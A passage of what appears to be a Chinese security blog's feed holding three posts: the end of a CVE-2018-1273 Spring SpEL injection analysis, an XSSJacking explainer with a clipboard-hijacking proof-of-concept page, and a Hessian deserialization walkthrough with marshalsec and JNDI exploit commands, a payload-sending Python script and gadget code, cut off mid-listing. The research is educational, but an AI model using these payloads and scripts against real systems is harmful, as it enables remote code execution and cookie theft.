class="string">"\\[.*?\\]"</span>, <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">return</span> PropertyPath.from(plainPropertyPath, type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是通过正则将包括中括号在内的内容给替换为空，然后判断剩下的内容是否为type里的属性。这里type就是在Controller处用到的用于接收参数的类。</p><p>因此，我们可以用这个类的一个字段再加上[payload]来构造恶意的SpEL表达式就可以实现RCE了。</p><p>还有一个坑，就是下面这段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">context.setTypeLocator(typeName -&gt; &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这是Spring Data Commons 2.0.5版本中添加的用来拒绝SpEL表达式的。这里如果直接使用<code>T(java.lang.Runtime).getRuntime().exec(&#39;calc.exe&#39;)</code>这样的原始payload是不会成功触发的，但是可以像前面复现那样利用反射来绕过。</p><p>接着我们看下外部参数是通过那个Controller进来的。</p><p>代码位置为：<a href="https://github.com/spring-projects/spring-data-examples/blob/master/web/example/src/main/java/example/users/web/UserController.java#L83" target="_blank" rel="noopener">https://github.com/spring-projects/spring-data-examples/blob/master/web/example/src/main/java/example/users/web/UserController.java#L83</a></p><p>这是Controller的代码，register()函数支持POST方式获取用户表单参数数据，这其中就有UserForm、BindingResult、Model：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Registers a new &#123;<span class="doctag">@link</span> User&#125; for the data provided by the given &#123;<span class="doctag">@link</span> UserForm&#125;. Note, how an interface is used to</span></span><br><span class="line"><span class="comment">* bind request parameters.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> userForm the request data bound to the &#123;<span class="doctag">@link</span> UserForm&#125; instance.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> binding the result of the binding operation.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> model the Spring MVC &#123;<span class="doctag">@link</span> Model&#125;.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(method = RequestMethod.POST)</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">register</span><span class="params">(UserForm userForm, BindingResult binding, Model model)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    userForm.validate(binding, userManagement);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (binding.hasErrors()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"users"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    userManagement.register(<span class="keyword">new</span> Username(userForm.getUsername()), Password.raw(userForm.getPassword()));</span><br><span class="line"></span><br><span class="line">    RedirectView redirectView = <span class="keyword">new</span> RedirectView(<span class="string">"redirect:/users"</span>);</span><br><span class="line">    redirectView.setPropagateQueryParams(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirectView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在问题是这段Controller代码是怎么和漏洞类MapDataBinder关联起来的。</p><p>看廖新喜大佬的博客，说是Form表单的提交操作会调用到ProxyingHandlerMethodArgumentResolver，而ProxyingHandlerMethodArgumentResolver中使用了MapDataBinder的接口，从而使之触发。</p><p>ProxyingHandlerMethodArgumentResolver中使用MapDataBinder的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* (non-Javadoc)</span></span><br><span class="line"><span class="comment">* @see org.springframework.web.method.annotation.ModelAttributeMethodProcessor#createAttribute(java.lang.String, org.springframework.core.MethodParameter, org.springframework.web.bind.support.WebDataBinderFactory, org.springframework.web.context.request.NativeWebRequest)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">createAttribute</span><span class="params">(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 NativeWebRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    MapDataBinder binder = <span class="keyword">new</span> MapDataBinder(parameter.getParameterType(), conversionService.getObject());</span><br><span class="line">    binder.bind(<span class="keyword">new</span> MutablePropertyValues(request.getParameterMap()));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> proxyFactory.createProjection(parameter.getParameterType(), binder.getTarget());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ProxyingHandlerMethodArgumentResolver实现了 BeanFactoryAware和BeanClassLoaderAware，所以是在Bean装配后被自动调用的。</p><p>具体的Controller到MapDataBinder类触发的过程及原理分析可参考：</p><p><a href="https://github.com/iflody/myBugAnalyze/blob/master/2018/CVE-2018-1273/README.md" target="_blank" rel="noopener">https://github.com/iflody/myBugAnalyze/blob/master/2018/CVE-2018-1273/README.md</a></p><p><a href="https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/" target="_blank" rel="noopener">https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/</a></p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>看下Spring Data Commons 2.0.6版本的官方补丁是如何修复的：<a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="noopener">https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a></p><p><img src="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/5.png" alt=""></p><p>其实就是使用了SpEL表达式注入漏洞的通用修补方法，即将StandardEvaluationContext替代为SimpleEvaluationContext，由于StandardEvaluationContext权限过大，可以执行任意代码，会被恶意用户利用。 SimpleEvaluationContext的权限则小的多，只支持一些Map结构，通用的jang.lang.Runtime、java.lang.ProcessBuilder等都已经不再支持，这样也就成功防御了SpEL表达式注入漏洞。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://xz.aliyun.com/t/2269" target="_blank" rel="noopener">Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&amp;mid=2247483666&amp;idx=1&amp;sn=91e3b2aab354c55e0677895c02fb068c" target="_blank" rel="noopener">CVE-2018-1273: RCE with Spring Data Commons 分析和利用</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/categories/Java/Spring/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
      <category term="SpEL注入" scheme="https://www.mi1k7ea.com/tags/SpEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析XSSJacking</title>
    <link href="https://www.mi1k7ea.com/2020/01/26/%E6%B5%85%E6%9E%90XSSJacking/"/>
    <id>https://www.mi1k7ea.com/2020/01/26/浅析XSSJacking/</id>
    <published>2020-01-26T07:49:05.000Z</published>
    <updated>2020-01-28T02:55:43.303Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>主要是参考学习了这篇文章的姿势：<a href="https://www.freebuf.com/articles/web/130462.html" target="_blank" rel="noopener">一种结合了点击劫持、Self-XSS、复制粘贴劫持的新型XSS攻击</a></p><h2 id="0x01-XSSJacking"><a href="#0x01-XSSJacking" class="headerlink" title="0x01 XSSJacking"></a>0x01 XSSJacking</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>XSSJacking即XSS劫持，是一种另类的XSS利用方式。具体的说，就是结合Self-XSS、ClickJacking、复制粘贴劫持等漏洞进行组合利用，提高Self-XSS漏洞危害程序。</p><p>Self-XSS(自跨站脚本攻击)是一种由受害者自己输入XSS payload触发才能成功的XSS攻击行为，这种攻击可基于DOM，或是建立在仅该用户可操作或可见的域。</p><p>ClickJacking即点击劫持，是指在一个Web页面下隐藏了一个透明的iframe（opacity：0），用外层假页面诱导用户点击，实际上是在隐藏的frame上触发了点击事件进行一些用户不知情的操作。通常是因为目标服务器未设置X-Frame-Options头或未安全设置该头导致存在ClickJacking漏洞的。</p><p>复制粘贴劫持，就是在诱使用户进行复制粘贴操作时，会进行一些恶意的操作。</p><h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><p>目标站点某个页面存在Self-XSS，并且目标站点存在ClickJacking漏洞，此时这种攻击就能派上用场了。</p><h4 id="目标站点存在Self-XSS"><a href="#目标站点存在Self-XSS" class="headerlink" title="目标站点存在Self-XSS"></a>目标站点存在Self-XSS</h4><p>xssjacking.html，存在Self-XSS的页面，需要引入angular.min.js和main.js，主要是有一个文本输入框，其中ng-change指令的作用是当输入框的值改变时执行函数，ng-model指令可以将输入域的值与 AngularJS 创建的变量绑定。：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"angular.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">ng-app</span>=<span class="string">"xssApp"</span> <span class="attr">ng-controller</span>=<span class="string">"mainController"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span> <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">placeholer</span>=<span class="string">"Vulnerable to XSS"</span> <span class="attr">ng-model</span>=<span class="string">"textArea"</span> <span class="attr">ng-change</span>=<span class="string">"checkForAlert(textArea)"</span> <span class="attr">style</span>=<span class="string">"height:100%; width:100%;"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>main.js代码如下，模拟的输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>即可X自己，这里需要AngularJS的支持：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> redisApp = angular.module(<span class="string">'xssApp'</span>, []);</span><br><span class="line">redisApp.controller(<span class="string">'mainController'</span>, [<span class="string">'$scope'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">    $scope.checkForAlert = <span class="function"><span class="keyword">function</span>(<span class="params">text</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(text == <span class="string">"&lt;script&gt;alert(document.cookie)&lt;/script&gt;"</span>)&#123;</span><br><span class="line">            alert(<span class="built_in">document</span>.cookie);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;]);</span><br></pre></td></tr></table></figure><p>这个页面就是个文本输入界面，当用户自己输入XSS payload时就会弹框：</p><p><img src="/2020/01/26/浅析XSSJacking/1.png" alt=""></p><h4 id="目标站点存在ClickJacking"><a href="#目标站点存在ClickJacking" class="headerlink" title="目标站点存在ClickJacking"></a>目标站点存在ClickJacking</h4><p>我们查看响应，发现目标站点并未设置X-Frame-Options头，即存在ClickJacking漏洞：</p><p><img src="/2020/01/26/浅析XSSJacking/2.png" alt=""></p><p>接着，攻击者可以编写如下PoC：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        Enter your email below to register:</span><br><span class="line">        <span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span> <span class="attr">style</span>=<span class="string">"width:220px; height:35px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">        Repeat your email:</span><br><span class="line">        <span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">"width:230px; height:50px;"</span> <span class="attr">frameBorder</span>=<span class="string">"0"</span> <span class="attr">src</span>=<span class="string">"xssjacking.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.addEventListener(<span class="string">'copy'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(e);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// </span></span></span><br><span class="line"><span class="actionscript">                e.clipboardData.setData(<span class="string">'text/plain'</span>, <span class="string">'\x3cscript\x3ealert(document.cookie)\x3c/script\x3e'</span>);</span></span><br><span class="line"><span class="actionscript">                e.preventDefault(); <span class="comment">// We want our data, not data from any selection, to be written to the clipboard</span></span></span><br><span class="line"><span class="undefined">            &#125;);</span></span><br><span class="line"><span class="undefined">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>简单地说，该恶意页面表面是输入邮箱和验证邮箱的表单，实际是通过iframe标签引入隐藏的页面即存在Self-XSS漏洞的页面，其中页面通过JS实现复制粘贴劫持攻击，当用户在该页面进行粘贴操作时其中的内容就会被替换为Self-XSS的payload，也就是说实际上是在Self-XSS页面中输入了XSS payload。</p><p>比如，已在目标站点登录获得cookie的用户被诱使访问了该恶意页面，输入邮箱之后，当再次输入验证邮箱时，用户通常会直接对前面输入的邮箱进行复制然后粘贴到下面验证的输入框中，此时就会触发Self-XSS弹框：</p><p><img src="/2020/01/26/浅析XSSJacking/3.png" alt=""></p><p>至此，攻击者就能通过钓鱼的手段结合ClickJacking、Self-XSS和复制粘贴劫持等漏洞实现窃取受害者的cookie等敏感信息。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>个人觉得就是利用ClickJacking和复制粘贴实现Self-XSS的利用，扩大Self-XSS的危害程序，使其和常规的XSS一样存在高风险。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://www.mi1k7ea.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Java Hessian反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/01/25/Java-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/01/25/Java-Hessian反序列化漏洞/</id>
    <published>2020-01-25T00:46:52.000Z</published>
    <updated>2020-02-02T09:39:23.955Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Hessian简介"><a href="#0x01-Hessian简介" class="headerlink" title="0x01 Hessian简介"></a>0x01 Hessian简介</h2><p>Hessian是一个轻量级的remoting onhttp工具，是一个轻量级的Java序列化/反序列化框架，使用简单的方法提供了RMI的功能。 相比WebService，Hessian更简单、快捷。采用的是二进制RPC协议，因为采用的是二进制协议，所以它很适合于发送二进制数据。</p><p>Hessian序列化/反序列化机制的基本概念图如下：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/16.png" alt=""></p><ul><li>AbstractSerializerFactory：抽象序列化器工厂，是管理和维护对应序列化/反序列化机制的工厂，拥有getSerializer()和getDeserializer()方法。默认的几种实现如下：<ul><li>SerializerFactory：标准的实现。</li><li>ExtSerializerFactory：可以设置自定义的序列化机制，通过该Factory可以进行扩展。</li><li>BeanSerializerFactory：对SerializerFactory的默认Object的序列化机制进行强制指定，指定为BeanSerializer。 </li></ul></li><li>Serializer：序列化的接口，拥有writeObject()方法。</li><li>Deserializer：反序列化的接口，拥有readObject()、resdMap()、readList()方法。</li><li>AbstractHessianInput：Hessian自定义的输入流，提供对应的read各种类型的方法。</li><li>AbstractHessianOutput：Hessian自定义的输出流，提供对应的write各种类型的方法。</li></ul><p>在Hessian的Serializer中，有以下几种默认实现的序列化器：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/17.png" alt=""></p><p>在Hessian的Deserializer中，有以下几种默认实现的反序列化器：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/18.png" alt=""></p><p>这里我们关注到MapDeserializer这个反序列化器即可，其在后面的反序列化漏洞利用中应用到。</p><h2 id="0x02-Hessian反序列化漏洞"><a href="#0x02-Hessian反序列化漏洞" class="headerlink" title="0x02 Hessian反序列化漏洞"></a>0x02 Hessian反序列化漏洞</h2><p>和Java原生的序列化对比，Hessian更加高效并且非常适合二进制数据传输。既然是一个序列化/反序列化框架，Hessian同样存在反序列化漏洞的问题。</p><p>对于Hessian反序列化漏洞的利用，使用ysoserial工具的Gadget是无法成功的，而是要用marshalsec工具的Gadget。</p><p>marshalsec工具项目如下：<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a></p><p>针对Hessian反序列化过程进行攻击，就需要使用特殊的Gadget，在marshalsec这个工具里，已经有了5个可用的Gadgets。分别是：</p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringAbstractBeanFactoryPointcutAdvisor</li></ul><h3 id="复现——Resin-Gadget"><a href="#复现——Resin-Gadget" class="headerlink" title="复现——Resin Gadget"></a>复现——Resin Gadget</h3><p>Hessian环境搭建按照参考文章很方便就搞好。</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/3.png" alt=""></p><p>和JNDI注入时一样，现在要搭建恶意的JNDI服务端，这里直接用JNDI注入利用工具项目而不用像之前一样自己写服务端代码：<a href="https://github.com/welk1n/JNDI-Injection-Exploit" target="_blank" rel="noopener">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>使用方法如下，-C参数为需要执行的命令，-A参数为监听地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</span><br></pre></td></tr></table></figure><p>这里我们用直接启动就行，可以看到是有三个不同的服务端对应不同的端口：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/1.png" alt=""></p><p>直接用marshalsec来生成payload，这里地址指定为JettyServer并在指定恶意执行类为ExecTemplateJDK7：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian Resin http://127.0.0.1:8180/ ExecTemplateJDK7&gt;hessian</span><br></pre></td></tr></table></figure><p>最后就是编写序列化的payload发送到服务器，这里直接看下原作者的脚本是怎么写的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">h<span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># code by 21superman</span></span><br><span class="line"><span class="comment"># Date 2018年12月28日</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(name)</span>:</span></span><br><span class="line">    header=<span class="string">b'\x63\x02\x00\x48\x00\x04'</span>+<span class="string">'test'</span></span><br><span class="line">    <span class="keyword">with</span> open(name,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> header+f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(url,payload)</span>:</span></span><br><span class="line">    <span class="comment">#proxies = &#123;'http':'127.0.0.1:8888'&#125;</span></span><br><span class="line">    headers=&#123;<span class="string">'Content-Type'</span>:<span class="string">'x-application/hessian'</span>&#125;</span><br><span class="line">    data=payload</span><br><span class="line">    res=requests.post(url,headers=headers,data=data)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">"-u"</span>, help=<span class="string">"hessian site url eg.http://127.0.0.1:8080/HessianTest/hessian"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-p"</span>,help=<span class="string">"payload file"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.u==<span class="keyword">None</span> <span class="keyword">or</span> args.p==<span class="keyword">None</span>:</span><br><span class="line">        print(<span class="string">'eg. python hessian.py -u http://127.0.0.1:8080/HessianTest/hessian -p hessian'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        send(args.u, load(args.p))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line">    <span class="comment">#load('hessian')</span></span><br></pre></td></tr></table></figure><p>先是将marshalsec生成的payload和构造的header拼接成Hessian格式的序列化内容，然后通过POST方式发送该Hessian序列化的内容，其中需要指定Content-Type头为’x-application/hessian’让服务端识别出事Hessian序列化类型的数据。</p><p>运行脚本，成功触发反序列化漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python hessian.py -u http://127.0.0.1:8080/HessianTest/hessian -p hessian</span><br></pre></td></tr></table></figure><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/2.png" alt=""></p><h3 id="Resin-Gadget分析"><a href="#Resin-Gadget分析" class="headerlink" title="Resin Gadget分析"></a>Resin Gadget分析</h3><p>调试分析之前，我们需要知道marshalsec中Resin Gadget到底是如何触发反序列化漏洞RCE的。</p><p>我们看下Gadget怎么写的：<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/Resin.java" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/Resin.java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> marshalsec.gadgets;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.DirContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> marshalsec.MarshallerBase;</span><br><span class="line"><span class="keyword">import</span> marshalsec.UtilFactory;</span><br><span class="line"><span class="keyword">import</span> marshalsec.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Resin</span> <span class="keyword">extends</span> <span class="title">Gadget</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Args</span> ( minArgs = <span class="number">2</span>, args = &#123;</span><br><span class="line">        <span class="string">"codebase"</span>, <span class="string">"class"</span></span><br><span class="line">    &#125;, defaultArgs = &#123;</span><br><span class="line">        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass</span><br><span class="line">    &#125; )</span><br><span class="line">    <span class="function"><span class="keyword">default</span> Object <span class="title">makeResinQName</span> <span class="params">( UtilFactory uf, String[] args )</span> <span class="keyword">throws</span> 